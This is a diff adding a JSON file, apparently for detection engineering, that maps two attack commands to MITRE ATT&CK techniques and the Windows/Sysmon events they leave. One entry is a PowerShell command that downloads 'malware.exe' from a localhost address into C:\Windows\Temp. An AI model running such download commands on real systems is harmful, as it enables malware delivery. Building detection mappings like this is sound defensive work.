@@ -1,0 +1,41 @@
+[
+  {
+    "primitive_id": "PS-007",
+    "primitive_command": "whoami /groups",
+    "intent": [
+      "Permission Group Discovery"
+    ],
+    "mitre_ttps": [
+      "T1069.001"
+    ],
+    "telemetry_rules": [
+      {
+        "source": "Security",
+        "event_id": 4688,
+        "details": "Process created: whoami.exe with command line whoami /groups"
+      }
+    ]
+  },
+  {
+    "primitive_id": "PS-015",
+    "primitive_command": "Invoke-WebRequest -Uri http://127.0.0.1/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe",
+    "intent": [
+      "Ingress Tool Transfer"
+    ],
+    "mitre_ttps": [
+      "T1105"
+    ],
+    "telemetry_rules": [
+      {
+        "source": "Sysmon",
+        "event_id": 3,
+        "details": "Network connection by: powershell.exe to destination 127.0.0.1"
+      },
+      {
+        "source": "Sysmon",
+        "event_id": 11,
+        "details": "File created: C:\\Windows\\Temp\\malware.exe by powershell.exe"
+      }
+    ]
+  }
+]
